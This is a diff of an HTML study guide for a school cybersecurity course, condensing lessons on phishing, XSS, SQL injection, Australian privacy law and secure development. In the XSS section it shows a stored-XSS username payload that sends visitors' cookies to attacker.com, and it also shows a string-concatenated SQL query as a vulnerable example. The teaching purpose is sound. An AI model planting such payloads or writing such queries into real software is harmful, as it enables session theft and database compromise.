-    <li><b>Check the facts.</b> Got a weird message from your bank or a streaming service? Don't click their links — look up the company yourself.</li>
-    <li><b>Don't trust the link.</b> Links can be faked to look real. Hover to see where they lead, but it's safer to type the address yourself.</li>
-    <li><b>A message from a friend isn't automatically safe.</b> Hackers take over real accounts — verify another way.</li>
-    <li><b>Don't download random files</b> unless you know the person and were expecting the file.</li>
-    <li><b>Foreign prize or inheritance offers are 100% fake.</b> Delete them.</li>
-    <li><b>Never share personal or financial info.</b> Real companies never ask for passwords or bank details by email.</li>
-    <li><b>Ignore random offers or requests for help.</b> If you didn't ask, it's likely fake — find a legitimate charity yourself if you want to donate.</li>
-  </ol>
-
-  <h3><span class="tag">Compare</span>Proactive vs reactive training</h3>
+  <h3>Organisational defences</h3>
+  <ul>
+    <li><b>Employee education</b> — the most effective defence is a well-informed workforce. Ongoing, practical, tailored to operations.</li>
+    <li><b>Policies &amp; procedures</b> — verification protocols, information handling, approval workflows, physical security.</li>
+    <li><b>Email filtering</b> — high spam settings and conversation threading make phishing easier to spot.</li>
+    <li><b>Secure, updated devices</b> — outdated software is a key target; anti-virus alone is insufficient.</li>
+  </ul>
+  <h3>Spotting scams as an individual</h3>
+  <ul>
+    <li><b>Don't rush</b> — scammers want panic. <b>Check the facts</b> — look the company up yourself rather than using their link.</li>
+    <li><b>Don't trust the link</b> — hover to check, but typing the address is safer.</li>
+    <li><b>A message from a friend isn't automatically safe</b> — accounts get taken over; verify another way.</li>
+    <li><b>Don't download unexpected files.</b> Foreign prize or inheritance offers are <b>100% fake</b>.</li>
+    <li><b>Never share personal or financial info</b> — real companies don't ask by email. Ignore unsolicited offers or requests for help.</li>
+  </ul>
+  <h3>Proactive vs reactive training</h3>
   <div class="ad">
     <div class="a">
-      <h4>Security awareness training — proactive</h4>
-      <p>Being ready <i>before</i> an attack happens — like learning to recognise and dodge a trap. Teaches spotting scams (phishing emails, fake calls), knowing the risks, staying safe online, reporting problems, and keeping training fresh with regular reminders.</p>
-      <p><i>Example:</i> a fake email pretending to be from your school asks for login credentials — training helps you spot it and avoid clicking.</p>
+      <h4>Security awareness</h4>
+      <p>Ready <i>before</i> an attack: spot scams, know the risks, stay safe online, report problems, refresh regularly. Stops attacks before they happen; builds safer habits.</p>
     </div>
     <div class="d">
-      <h4>Incident response training — reactive</h4>
-      <p>Kicks in <i>after</i> something goes wrong. Teaches how to respond to an attack or breach: noticing something's wrong, stopping the damage by shutting down the problem area, saving evidence, telling the right people (IT or cyber security staff), and fixing it.</p>
-      <p><i>Example:</i> someone clicks a bad link and the network gets infected — this training helps staff contain and repair it fast.</p>
+      <h4>Incident response</h4>
+      <p>Kicks in <i>after</i>: notice the problem, contain it by shutting down the affected area, save evidence, tell IT/security, fix it. Builds fast, smart reactions.</p>
     </div>
   </div>
-  <table>
-    <thead><tr><th style="width:50%">Security awareness</th><th>Incident response</th></tr></thead>
-    <tr><td>Stops attacks before they happen.</td><td>Reacts after an attack has started.</td></tr>
-    <tr><td>Focuses on educating people to spot threats.</td><td>Focuses on how to act when something goes wrong.</td></tr>
-    <tr><td>Builds habits for safer behaviour.</td><td>Builds skills for fast, smart reactions.</td></tr>
-  </table>
   <div class="box plain">
     <div class="lab">The analogy</div>
-    <p>Think of it like <b>seatbelts and airbags</b> — security awareness helps stop things before they go wrong, incident response helps minimise damage when they do. Together, they form a strong defence against cyber threats.</p>
-  </div>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Name all six social engineering types and give a one-line example of each.</li>
-      <li>What distinguishes spear phishing from phishing? Pretexting from baiting?</li>
-      <li>Give the three key differences between security awareness and incident response training.</li>
-    </ol>
+    <p><b>Seatbelts and airbags</b> — awareness stops things going wrong; incident response minimises damage when they do. Together they form a strong defence.</p>
   </div>
 </section>
 
-<!-- ═══════════════ W2 L4 ═══════════════ -->
 <section class="lesson">
   <h2><span class="wk">Week 2 · Lesson 4</span>Software Security</h2>
-  <p class="intro">Building security in from the start, and the two most common web application vulnerabilities: XSS and SQL injection.</p>
-
   <div class="box def">
-    <div class="lab">Security by Design (SbD)</div>
-    <p>When building software, security needs to be part of the plan <b>from the very beginning</b>, not tacked on at the end — like building a house with locks already in place, rather than adding them after you move in. SbD means thinking about how to protect data <b>before you write your first line of code</b>, and writing secure code that helps stop hackers and keeps users safe. It prevents problems rather than fixing them later.</p>
+    <div class="lab">Security by Design</div>
+    <p>Security is part of the plan <b>from the very beginning</b>, not tacked on at the end — building the house with the locks already in place. Think about protecting data <b>before the first line of code</b>, and write code that stops attackers. Prevents problems rather than fixing them later.</p>
   </div>
-
-  <h3><span class="tag">OWASP</span>Top 10 web application security risks</h3>
-  <p>The OWASP Foundation is a trusted group that helps developers understand common threats to web applications. Their Top 10 most serious risks:</p>
-  <table>
-    <tr><td class="num">01</td><td class="who" style="width:56mm">Broken access control</td><td>Users can access things they're not supposed to.</td></tr>
-    <tr><td class="num">02</td><td class="who">Cryptographic failures</td><td>Personal or financial information isn't stored or sent securely.</td></tr>
-    <tr><td class="num">03</td><td class="who">Injection</td><td>Attackers trick software into running harmful code.</td></tr>
-    <tr><td class="num">04</td><td class="who">Insecure design</td><td>Risks related to design flaws.</td></tr>
-    <tr><td class="num">05</td><td class="who">Security misconfiguration</td><td>Settings are too open or badly set up.</td></tr>
-    <tr><td class="num">06</td><td class="who">Vulnerable &amp; outdated components</td><td>Libraries or plugins with known security flaws.</td></tr>
-    <tr><td class="num">07</td><td class="who">Identification &amp; authentication failures</td><td>Login systems don't protect accounts properly.</td></tr>
-    <tr><td class="num">08</td><td class="who">Software &amp; data integrity failures</td><td>Assumptions about updates or critical data without verifying integrity.</td></tr>
-    <tr><td class="num">09</td><td class="who">Security logging &amp; monitoring failures</td><td>Attacks happen but no one notices or logs what happened.</td></tr>
-    <tr><td class="num">10</td><td class="who">Server-side request forgery</td><td>Data sent to your program can be tampered with.</td></tr>
-  </table>
-  <p style="color:var(--ink-faint);font-size:8.6pt">Resources: Secure Coding — Best Practices Handbook · Australian Government ISM, Guidelines for Software Development (ACSC) · OWASP Top Ten.</p>
-
-  <h3><span class="tag">Risk 1</span>Cross-site scripting (XSS)</h3>
-  <p>XSS is a security problem found in websites. It lets hackers add their own code — usually JavaScript — to a web page that other people will see. Someone can <b>inject</b> dangerous code into a website, and when other users visit, their browsers run the attacker's code without knowing it. XSS usually happens when a website takes user input (names, messages, comments) and <b>shows it on a page without checking or cleaning it first</b>.</p>
-  <h4>Why XSS is a big deal</h4>
-  <ul>
-    <li>Change how the website looks or behaves.</li>
-    <li>Steal private information like cookies.</li>
-    <li>Pretend to be the user and take actions on their behalf.</li>
-    <li>Spread the attack to other users like a virus.</li>
-  </ul>
-  <h4>Stored XSS</h4>
-  <p>Say there's a message board where people register with a username. If the site doesn't clean up what people type, a hacker could register with a name containing a script that sends the user's cookies to the hacker's website:</p>
-  <pre><span class="c">// example username</span>
-user123&lt;script&gt;document.location='https://attacker.com/?cookie='+encodeURIComponent(document.cookie)&lt;/script&gt;</pre>
-  <p>When someone visits the board and sees this username, their browser runs the code and silently sends their cookies to the hacker, who can then hijack the login. This is <b>stored XSS</b> because the harmful code is saved in the website's database and shown to users again and again. Stored XSS can act like a <b>worm</b> — a social media profile with injected code infects everyone who visits, and those infected profiles spread it further until the whole site is under attack.</p>
+  <h3>OWASP Top 10 <span style="font-weight:400;color:var(--ink-faint)">— web application risks</span></h3>
+  <ol>
+    <li><b>Broken access control</b> — users reach things they shouldn't.</li>
+    <li><b>Cryptographic failures</b> — personal or financial data not stored or sent securely.</li>
+    <li><b>Injection</b> — software tricked into running harmful code.</li>
+    <li><b>Insecure design</b> — risks from design flaws.</li>
+    <li><b>Security misconfiguration</b> — settings too open or badly set up.</li>
+    <li><b>Vulnerable &amp; outdated components</b> — libraries or plugins with known flaws.</li>
+    <li><b>Identification &amp; authentication failures</b> — login systems don't protect accounts.</li>
+    <li><b>Software &amp; data integrity failures</b> — updates or critical data trusted without verification.</li>
+    <li><b>Security logging &amp; monitoring failures</b> — attacks happen unnoticed or unlogged.</li>
+    <li><b>Server-side request forgery</b> — data sent to your program can be tampered with.</li>
+  </ol>
+  <h3>Cross-site scripting (XSS)</h3>
+  <p>A flaw letting attackers add their own code — usually JavaScript — to a web page others will see, which their browsers run unknowingly. Happens when a site <b>displays user input without checking or cleaning it</b>.</p>
+  <p><b>Impact:</b> change how the site looks or behaves · steal private information like cookies · act as the user · spread to other users like a virus.</p>
+  <p><b>Stored XSS</b> — the harmful code is <b>saved in the database</b> and shown again and again. A username containing a script sends every visitor's cookies to the attacker, who hijacks their login:</p>
+  <pre>user123&lt;script&gt;document.location='https://attacker.com/?cookie='
++encodeURIComponent(document.cookie)&lt;/script&gt;</pre>
+  <p>It can act like a <b>worm</b>: an infected profile infects everyone who visits, and those profiles spread it further.</p>
   <div class="box mit">
-    <div class="lab">Preventing XSS — a zero-trust approach</div>
+    <div class="lab">Preventing XSS — zero trust</div>
     <ul>
-      <li>Sanitise all user input by <b>escaping special characters</b>.</li>
-      <li>Validate all user input for <b>type, length, range and format</b> using <b>server-side</b> validation.</li>
-      <li>Encode special characters in all output to the browser.</li>
-      <li>Users should have the option to disable client-side scripts.</li>
+      <li><b>Sanitise</b> all user input by escaping special characters.</li>
+      <li><b>Validate</b> for type, length, range and format, <b>server-side</b>.</li>
+      <li><b>Encode</b> special characters in all output to the browser.</li>
+      <li>Let users disable client-side scripts. Client-side validation helps but is <b>never relied on alone</b>.</li>
     </ul>
-    <p>Client-side validation can help reduce invalid inputs, but should <b>never be relied on by itself</b>.</p>
   </div>
-
-  <h3><span class="tag">Risk 2</span>SQL injection</h3>
-  <p>A code insertion technique used to attack data-driven applications, where malicious code is inserted into a normal SQL statement to dump the contents of a database. Malformed SQL queries are produced through <b>unsanitised user input</b>. Though easily preventable by validating input, this is often not done, letting attackers embed malicious code in a hard-coded SQL statement.</p>
-  <h4>Form 1 — Incorrectly filtered escape characters</h4>
-  <p>Occurs if user input is passed to an SQL statement without filtering escape characters:</p>
-  <pre><span class="c">// vulnerable query</span>
-"SELECT * FROM users WHERE username= '"+username+"'"</pre>
-  <p>The <code>username</code> variable can be crafted by attackers, either by inputting an <b>always-true clause</b> or by <b>commenting out the rest</b> of the query. By inserting a semicolon, attackers can execute a separate SQL statement.</p>
-  <h4>Form 2 — Incorrect type handling</h4>
-  <p>Takes place when <b>no appropriate type checking</b> is performed. The implementation can be the same as above — the injection works by prematurely terminating a text string and appending a new command. There are many other forms of injection beyond these two.</p>
+  <h3>SQL injection</h3>
+  <p>Malicious code inserted into a normal SQL statement to <b>dump the contents of a database</b>, produced through <b>unsanitised user input</b>. Easily prevented by validating input — but often isn't.</p>
+  <p><b>Incorrectly filtered escape characters</b> — user input passed straight into a statement:</p>
+  <pre>"SELECT * FROM users WHERE username= '"+username+"'"</pre>
+  <p>The attacker crafts <code>username</code> with an <b>always-true clause</b>, or <b>comments out the rest</b> of the query; a semicolon lets them run a separate statement. <b>Incorrect type handling</b> — no type checking, so a text string is terminated early and a new command appended.</p>
   <div class="box mit">
     <div class="lab">Preventing SQL injection</div>
     <ul>
-      <li><b>Validate user input</b> — assume all user-submitted data is unsafe. Use functions such as MySQL's <code>mysql_real_escape_string()</code> to ensure dangerous characters (like <code>'</code>) aren't passed to a query. Sanitise and filter with type, range and format checks.</li>
-      <li><b>Parameterised statements</b> — instead of embedding user input into a query string, use placeholders to receive parameters. This also solves the type-handling problem, since a placeholder can only receive a value of the correct type.</li>
-      <li><b>Prepared statements &amp; stored procedures</b> — store a prepared statement, feed it the data, and it assembles and sanitises on execution. Stored procedures group SQL statements into a logical unit and can be automatically parameterised, but they prevent <i>some</i> types of injection, not all — don't rely on them exclusively.</li>
-      <li><b>Database permissions &amp; firewalls</b> — least-privilege database permissions reduce vulnerabilities. Web application firewalls (WAF) and database firewalls identify and block unauthorised transactions, but can't be the only line of defence and may only slow attacks rather than prevent them.</li>
+      <li><b>Validate input</b> — assume all submitted data is unsafe; escape dangerous characters (e.g. <code>mysql_real_escape_string()</code>); check type, range and format.</li>
+      <li><b>Parameterised statements</b> — placeholders instead of embedding input; also fixes type handling, since a placeholder only accepts the correct type.</li>
+      <li><b>Prepared statements &amp; stored procedures</b> — the statement assembles and sanitises the data on execution. Prevents <i>some</i> injection, not all — don't rely on them exclusively.</li>
+      <li><b>Least-privilege database permissions</b> · <b>WAF and database firewalls</b> — these block unauthorised transactions but can't be the only defence, and may only slow an attack.</li>
     </ul>
   </div>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Define Security by Design in one sentence, using the house analogy.</li>
-      <li>List as many of the OWASP Top 10 as you can, then check.</li>
-      <li>Explain why stored XSS spreads like a worm.</li>
-      <li>Why do parameterised statements fix <i>both</i> forms of SQL injection?</li>
-      <li>Why isn't a WAF sufficient on its own?</li>
-    </ol>
-  </div>
 </section>
-<!-- ═══════════════ W2 L5 ═══════════════ -->
-<section class="lesson pagebreak">
+<section class="lesson">
   <h2><span class="wk">Week 2 · Lesson 5</span>Key Legislation</h2>
-  <p class="intro">Three pieces of Australian legislation affecting how organisations control the collection, storage (including cloud storage) and communication of data. They also mention data disposal, covered in Week 3.</p>
-
-  <h3><span class="tag">Federal law</span>Privacy Act 1988</h3>
-  <p>A federal law covering <b>all states and territories in Australia</b>.</p>
-  <h4>Organisations covered</h4>
+  <p>Three Acts affect how organisations control the <b>collection, storage (including cloud) and communication</b> of data — and they also govern disposal.</p>
+  <h3>Privacy Act 1988 <span style="font-weight:400;color:var(--ink-faint)">— federal</span></h3>
+  <p><b>Covers:</b> Commonwealth departments · ACT government agencies · private organisations with turnover of at least <b>$3 million/year</b>, <b>or</b> holding health information, <b>or</b> buying/selling personal information for profit, <b>or</b> contracted to the Commonwealth.</p>
   <ul>
-    <li>Commonwealth government departments.</li>
-    <li>ACT government agencies.</li>
-    <li>Private organisations with: turnover of at least <b>$3 million/year</b>, <b>or</b> that hold health information, <b>or</b> that buy/sell personal information for profit, <b>or</b> that are contracted to provide a service to the Commonwealth.</li>
-  </ul>
-  <h4>Main points</h4>
-  <ul>
-    <li>Only collect information that is <b>necessary</b>.</li>
-    <li>Only use information for the <b>purpose it was intended</b>.</li>
-    <li>Do not disclose information to a third party for any other purpose.</li>
+    <li>Only collect information that is <b>necessary</b>; only use it for <b>the intended purpose</b>.</li>
+    <li>No disclosure to a third party for any other purpose.</li>
     <li>Individuals may <b>access and correct</b> information held about them.</li>
-    <li>The organisation must have a <b>publicly available privacy policy</b>.</li>
-    <li>The organisation must take steps to ensure the <b>quality and security</b> of information.</li>
+    <li>A <b>publicly available privacy policy</b> is required.</li>
+    <li>Steps must be taken to ensure the <b>quality and security</b> of information.</li>
   </ul>
   <div class="box law">
-    <div class="lab">Australian Privacy Principles (APPs)</div>
-    <p>Guidelines under the Privacy Act 1988 governing collection, use and disclosure of personal information — promoting transparency, data quality, security, individual access and complaint resolution.</p>
-    <table style="margin-bottom:0">
-      <tr><td class="num">APP 1</td><td class="who" style="width:52mm">Open &amp; transparent management</td><td>Be clear about how personal information is handled — privacy statements, easy-to-understand data policies.</td></tr>
-      <tr><td class="num">APP 3</td><td class="who">Collection of solicited information</td><td>Limits collection to what's reasonably necessary, collected lawfully and fairly — minimising data fields, clear consent.</td></tr>
-      <tr><td class="num">APP 6</td><td class="who">Use or disclosure</td><td>Information collected for a specific purpose must only be used or disclosed for that purpose unless the individual consents.</td></tr>
-      <tr><td class="num">APP 8</td><td class="who">Cross-border disclosure</td><td>Information transferred overseas must remain protected in line with the APPs — safeguards for cloud storage and processing.</td></tr>
-      <tr><td class="num">APP 9</td><td class="who">Government-related identifiers</td><td>Restricts using government identifiers (e.g. tax file numbers) for identification in private-sector databases.</td></tr>
-      <tr><td class="num">APP 11</td><td class="who">Security of personal information</td><td>Requires safeguarding against misuse, loss or unauthorised access — robust encryption, access controls, regular testing.</td></tr>
-    </table>
+    <div class="lab">Australian Privacy Principles</div>
+    <ul>
+      <li><b>APP 1</b> open &amp; transparent management — privacy statements, clear data policies.</li>
+      <li><b>APP 3</b> collection of solicited information — only what's reasonably necessary, lawful and fair.</li>
+      <li><b>APP 6</b> use or disclosure — purpose-bound unless the individual consents.</li>
+      <li><b>APP 8</b> cross-border disclosure — protection follows the data overseas (cloud).</li>
+      <li><b>APP 9</b> government-related identifiers — restricts using TFNs etc. in private databases.</li>
+      <li><b>APP 11</b> security of personal information — encryption, access controls, regular testing.</li>
+    </ul>
   </div>
-
-  <h3><span class="tag">State law · Victoria</span>Privacy and Data Protection Act 2014</h3>
-  <p>Governs the handling of personal information by <b>Victorian public sector organisations</b>, protecting privacy through principles for data collection, use and disclosure, and ensuring data security. A state law covering <b>only Victoria</b>.</p>
-  <h4>Organisations covered</h4>
-  <ul>
-    <li>Victorian government departments and public sector agencies.</li>
-    <li>Victoria Police.</li>
-    <li>State government schools.</li>
-    <li>Public Victorian universities.</li>
-    <li>Public hospitals and health services — <b>non-medical information only</b>; medical information is covered by the <b>Health Records Act 2001</b>.</li>
-    <li>Organisations providing government-funded services.</li>
-  </ul>
-  <p>Agencies must safeguard data with <b>security assessments and encryption</b>. While not mandatory, entities are <b>encouraged</b> to notify affected individuals after a significant breach. The <b>Victorian Information Commissioner</b> oversees compliance; penalties for breaches may include legal action or administrative orders.</p>
+  <h3>Privacy &amp; Data Protection Act 2014 <span style="font-weight:400;color:var(--ink-faint)">— Victoria only</span></h3>
+  <p><b>Covers:</b> Victorian departments and public sector agencies · Victoria Police · state government schools · public Victorian universities · public hospitals and health services (<b>non-medical information only</b> — medical is the <b>Health Records Act 2001</b>) · organisations providing government-funded services.</p>
+  <p>Agencies must safeguard data with <b>security assessments and encryption</b>. Breach notification is <b>encouraged, not mandatory</b>. The <b>Victorian Information Commissioner</b> oversees compliance; penalties include legal action or administrative orders.</p>
   <div class="box law">
-    <div class="lab">Information Privacy Principles (IPPs)</div>
-    <p>Outlined under the PDP Act 2014, applying to Victorian public sector agencies. These align with the APPs but are tailored to state-specific data protection.</p>
-    <table style="margin-bottom:0">
-      <tr><td class="num">IPP 1</td><td class="who" style="width:44mm">Collection</td><td>Collected fairly, lawfully and not intrusively — ask only for necessary info, inform users of the purpose.</td></tr>
-      <tr><td class="num">IPP 2</td><td class="who">Use &amp; disclosure</td><td>Restricts how information can be used or disclosed (aligns with APP 6) — shared only per policy and user consent.</td></tr>
-      <tr><td class="num">IPP 4</td><td class="who">Data security</td><td>Protected from misuse, loss, unauthorised access and modification — encryption, secure authentication, regular updates.</td></tr>
-      <tr><td class="num">IPP 5</td><td class="who">Openness</td><td>Agencies must be open about how information is managed — privacy policy links, clear documentation.</td></tr>
-      <tr><td class="num">IPP 7</td><td class="who">Unique identifiers</td><td>Restricts adopting identifiers assigned by other organisations unless necessary, consented to, or via a contracted provider.</td></tr>
-      <tr><td class="num">IPP 9</td><td class="who">Transborder data flows</td><td>Information must not leave Victoria unless the recipient jurisdiction has equivalent privacy protections.</td></tr>
-      <tr><td class="num">IPP 10</td><td class="who">Sensitive information</td><td>Stricter handling of sensitive information (e.g. health or ethnic background) — high security, limited access.</td></tr>
-    </table>
+    <div class="lab">Information Privacy Principles</div>
+    <ul>
+      <li><b>IPP 1</b> collection — fair, lawful, not intrusive; state the purpose.</li>
+      <li><b>IPP 2</b> use &amp; disclosure — aligns with APP 6.</li>
+      <li><b>IPP 4</b> data security — protected from misuse, loss, unauthorised access and modification. <b>IPP 4.2</b> destroy or de-identify data no longer needed.</li>
+      <li><b>IPP 5</b> openness · <b>IPP 7</b> unique identifiers.</li>
+      <li><b>IPP 9</b> transborder data flows — data must not leave Victoria unless equivalent protection exists.</li>
+      <li><b>IPP 10</b> sensitive information — stricter handling of health or ethnic background data.</li>
+    </ul>
   </div>
-
-  <h3><span class="tag">Federal law</span>Copyright Act 1968</h3>
-  <p>A federal law applying across all states and territories, establishing the legal framework for copyright protection. Updated in 2000 by the <b>Copyright Amendment (Digital Agenda) Bill 2000</b> to address digital technology and online content distribution.</p>
-  <p>It protects <b>intellectual property (IP)</b> — original creations of the mind including written text, videos, software and artistic works — granting creators exclusive control over the use of their work.</p>
-  <h4>Main points</h4>
+  <h3>Copyright Act 1968 <span style="font-weight:400;color:var(--ink-faint)">— federal</span></h3>
+  <p>Protects <b>intellectual property</b> — original creations of the mind including text, video, software and artistic works. Updated by the <b>Copyright Amendment (Digital Agenda) Bill 2000</b> for digital distribution.</p>
   <ul>
-    <li><b>Ownership</b> — IP belongs to the creator unless assigned otherwise (e.g. to an employer).</li>
-    <li><b>Automatic protection</b> — copyright is automatic and free once work is in a tangible form.</li>
-    <li><b>Types protected</b> — literary, dramatic, musical and artistic works, films, sound recordings, broadcasts.</li>
-    <li><b>Exclusions</b> — ideas, concepts, names, slogans or images of people are not covered.</li>
-    <li><b>Control of usage</b> — owners control how and when material is used and shared.</li>
-    <li><b>Employer rights</b> — employers hold copyright over works employees produce as part of their job.</li>
-    <li><b>Personal use exception</b> — copying music you legally own (e.g. CD to device) for personal use only.</li>
+    <li><b>Ownership</b> — the creator's unless assigned; <b>employers</b> hold copyright over work produced as part of a job.</li>
+    <li><b>Automatic and free</b> once the work is in tangible form.</li>
+    <li><b>Protected</b> — literary, dramatic, musical and artistic works, films, sound recordings, broadcasts.</li>
+    <li><b>Not protected</b> — ideas, concepts, names, slogans, images of people.</li>
+    <li><b>Personal use exception</b> — format-shifting media you legally own.</li>
+    <li><b>Infringement</b> — civil penalties (cessation orders, damages); criminal charges and imprisonment in severe cases.</li>
   </ul>
-  <div class="box warn">
-    <div class="lab">Infringement</div>
-    <p>Can lead to <b>civil penalties</b> — court-ordered cessation, financial damages — or, in severe cases, <b>criminal charges and imprisonment</b>.</p>
-  </div>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Which Act covers a Victorian state school? A private company turning over $5M? A public hospital's medical records?</li>
-      <li>State APP 11 and IPP 4 and explain how they differ in scope.</li>
-      <li>Under the Copyright Act, who owns code you write as part of your job?</li>
-      <li>Which APP and which IPP deal with data leaving the country?</li>
-    </ol>
-  </div>
 </section>
 
-<!-- ═══════════════ W2 L6 ═══════════════ -->
 <section class="lesson">
   <h2><span class="wk">Week 2 · Lesson 6</span>Improving Development Security</h2>
-  <p class="intro">Building security in from day one — onboarding, ongoing training, and risk management planning.</p>
-
   <div class="box def">
-    <div class="lab">What is secure development?</div>
-    <p>The process of creating software <b>designed to be safe from the start</b>. Instead of waiting until something goes wrong, secure development means thinking about security at every stage — planning, coding, testing, deployment. It's about writing code that protects against hackers and malicious attacks, keeps user data safe, prevents bugs that could be exploited, and follows best practices and legal standards. Like building a house with strong locks, alarms and fire exits already in place — not adding them after someone breaks in.</p>
+    <div class="lab">Secure development</div>
+    <p>Creating software <b>designed to be safe from the start</b> — security at every stage, from planning and coding to testing and deployment. It protects against attack, keeps user data safe, prevents exploitable bugs, and follows best practice and legal standards. <b>Why it matters:</b> protects user data · prevents costly post-release fixes · builds trust · meets legal and industry requirements.</p>
   </div>
-
-  <div class="box plain">
-    <div class="lab">Why it matters</div>
-    <ul>
-      <li><b>Protects user data</b> — passwords, credit card numbers, personal information.</li>
-      <li><b>Prevents costly problems</b> — fixing a breach after release is expensive and damaging.</li>
-      <li><b>Builds trust</b> — users and clients prefer software they know is safe.</li>
-      <li><b>Meets legal and industry standards</b> — many industries require secure coding by law.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Strategy 1</span>Onboarding &amp; induction for developers</h3>
-  <p>Onboarding is the process of welcoming new developers to a project or team — setting them up for success, especially when it comes to writing secure code. When security is part of the team culture <b>from day one</b>, developers are more likely to follow good habits and avoid risky mistakes.</p>
+  <h3>1 · Onboarding &amp; induction</h3>
+  <p>When security is part of team culture <b>from day one</b>, developers follow good habits and avoid risky mistakes.</p>
   <ul>
-    <li><b>Security briefings</b> — a short session on security during first-day orientation.</li>
-    <li><b>Access control</b> — only give new developers the permissions they need, not full access "just in case".</li>
-    <li><b>Codebase walkthroughs</b> — show how security is handled in the code (encryption, authentication, error handling).</li>
-    <li><b>Team introductions</b> — make sure new developers know who to talk to about security questions.</li>
+    <li><b>Security briefings</b> in first-day orientation.</li>
+    <li><b>Access control</b> — only the permissions they need, not full access "just in case".</li>
+    <li><b>Codebase walkthroughs</b> — how encryption, authentication and error handling are done here.</li>
+    <li><b>Team introductions</b> — who to ask about security.</li>
   </ul>
-
-  <h3><span class="tag">Strategy 2</span>Developer training</h3>
-  <p>Even experienced developers make mistakes. Ongoing training keeps security top of mind and helps everyone stay up to date with the latest threats and best practices.</p>
-  <div class="split">
-    <div class="box plain">
-      <div class="lab">Focus areas</div>
-      <ul>
-        <li><b>Common vulnerabilities</b> — XSS, SQL injection, broken authentication.</li>
-        <li><b>Safe coding standards</b> — validating input, encoding output.</li>
-        <li><b>Security tools</b> — tools that scan code for weaknesses.</li>
-        <li><b>OWASP Top 10</b> — the most critical risks, updated regularly.</li>
-      </ul>
-    </div>
-    <div class="box plain">
-      <div class="lab">Ways to train</div>
-      <ul>
-        <li><b>Online courses</b> — self-paced learning (e.g. Codecademy).</li>
-        <li><b>Workshops and hackathons</b> — hands-on security problem solving.</li>
-        <li><b>Refresher sessions</b> — short, regular reviews of key topics.</li>
-        <li><b>Code reviews</b> — peer review focused on spotting security issues.</li>
-      </ul>
-    </div>
-  </div>
-
-  <h3><span class="tag">Strategy 3</span>Developing risk management plans</h3>
-  <p>A risk management plan helps teams think ahead — a document outlining what could go wrong, how likely it is, and what to do about it. Instead of waiting for problems, risk management is <b>proactive</b>: spotting issues early and reducing their impact.</p>
+  <h3>2 · Developer training</h3>
+  <p><b>Focus:</b> common vulnerabilities (XSS, SQL injection, broken authentication) · safe coding standards (validate input, encode output) · security tools that scan code · the OWASP Top 10.</p>
+  <p><b>Methods:</b> online courses · workshops and hackathons · short refresher sessions · peer code reviews focused on security.</p>
+  <h3>3 · Risk management plans</h3>
+  <p>A document setting out what could go wrong, how likely it is, and what to do — <b>proactive</b> rather than waiting for problems.</p>
   <ol>
-    <li><b>Identify risks</b> — what could go wrong? (e.g. using outdated libraries)</li>
-    <li><b>Assess risks</b> — how likely is it? How serious would it be?</li>
-    <li><b>Plan responses</b> — what actions will you take if the risk becomes real?</li>
-    <li><b>Monitor</b> — keep an eye on risks throughout the project and update the plan.</li>
+    <li><b>Identify risks</b> — what could go wrong?</li>
+    <li><b>Assess</b> — how likely, and how serious?</li>
+    <li><b>Plan responses</b> — what will you do if it happens?</li>
+    <li><b>Monitor</b> — track throughout the project and update.</li>
   </ol>
-  <h4>Examples of software risks</h4>
-  <ul>
-    <li><b>Insecure third-party libraries</b> — external code might have hidden vulnerabilities.</li>
-    <li><b>Lack of input validation</b> — not checking user input can lead to attacks.</li>
-    <li><b>Poor user authentication</b> — weak login systems can be easily bypassed.</li>
-    <li><b>Delayed patching</b> — not fixing known issues quickly leaves software exposed.</li>
-  </ul>
-
-  <h4>Worked example — School Attendance App</h4>
+  <p><b>Typical software risks:</b> insecure third-party libraries · lack of input validation · poor user authentication · delayed patching.</p>
   <table>
-    <thead><tr><th style="width:12mm">ID</th><th style="width:56mm">Risk description</th><th style="width:26mm">Category</th><th>Potential cause</th></tr></thead>
-    <tr><td class="num">R1</td><td>Use of outdated third-party libraries</td><td>Technical</td><td>Lack of regular updates</td></tr>
-    <tr><td class="num">R2</td><td>Weak user authentication</td><td>Security</td><td>Poor password policies</td></tr>
-    <tr><td class="num">R3</td><td>Data loss during deployment</td><td>Operational</td><td>No backup strategy</td></tr>
-    <tr><td class="num">R4</td><td>Incomplete input validation</td><td>Security</td><td>Developer oversight</td></tr>
+    <thead><tr><th style="width:8mm">ID</th><th>Risk · cause</th><th style="width:16mm">Level</th><th>Response · owner</th></tr></thead>
+    <tr><td class="num">R1</td><td>Outdated third-party libraries — no regular updates <i>(technical)</i></td><td>High</td><td><b>Mitigate</b> — schedule regular library updates · Alex (DevOps)</td></tr>
+    <tr><td class="num">R2</td><td>Weak user authentication — poor password policies <i>(security)</i></td><td><b>Critical</b></td><td><b>Avoid</b> — implement MFA · Jamie (Backend)</td></tr>
+    <tr><td class="num">R3</td><td>Data loss during deployment — no backup strategy <i>(operational)</i></td><td>Medium</td><td><b>Mitigate</b> — automated backups before deployment · Taylor (SysAdmin)</td></tr>
+    <tr><td class="num">R4</td><td>Incomplete input validation — developer oversight <i>(security)</i></td><td>High</td><td><b>Mitigate</b> — validation checks and peer reviews · Morgan (Frontend)</td></tr>
   </table>
-  <div class="split">
-    <table>
-      <thead><tr><th style="width:12mm">ID</th><th>Likelihood</th><th>Impact</th><th>Risk level</th></tr></thead>
-      <tr><td class="num">R1</td><td>Medium</td><td>High</td><td><b>High</b></td></tr>
-      <tr><td class="num">R2</td><td>High</td><td>High</td><td><b>Critical</b></td></tr>
-      <tr><td class="num">R3</td><td>Low</td><td>Medium</td><td><b>Medium</b></td></tr>
-      <tr><td class="num">R4</td><td>Medium</td><td>High</td><td><b>High</b></td></tr>
-    </table>
-    <table>
-      <thead><tr><th style="width:12mm">ID</th><th>Monitoring method</th><th>Frequency</th><th>Status</th></tr></thead>
-      <tr><td class="num">R1</td><td>Dependency scanner reports</td><td>Weekly</td><td>Open</td></tr>
-      <tr><td class="num">R2</td><td>Security audit logs</td><td>Bi-weekly</td><td>In progress</td></tr>
-      <tr><td class="num">R3</td><td>Backup test logs</td><td>Monthly</td><td>Closed</td></tr>
-      <tr><td class="num">R4</td><td>Code review checklist</td><td>Per sprint</td><td>Open</td></tr>
-    </table>
-  </div>
-  <table>
-    <thead><tr><th style="width:12mm">ID</th><th style="width:26mm">Strategy</th><th style="width:74mm">Action plan</th><th>Responsible</th></tr></thead>
